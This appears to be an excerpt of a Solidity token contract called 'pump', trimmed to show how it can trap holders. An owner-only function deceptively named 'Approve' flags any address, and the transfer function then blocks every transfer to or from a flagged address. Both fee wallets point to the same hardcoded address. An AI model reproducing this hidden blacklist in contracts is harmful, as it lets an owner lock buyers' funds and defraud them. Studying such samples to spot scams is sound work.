...
contract pump is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x0C096129915Ae96277e9d0a1AA9DdB86fe563bBa); 
    address payable public teamWalletAddress = payable(0x0C096129915Ae96277e9d0a1AA9DdB86fe563bBa); 
    ...
    function Approve(address account, bool Spender) public onlyOwner {
        isLimit[account] = Spender;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isLimit[recipient] && !isLimit[sender]);
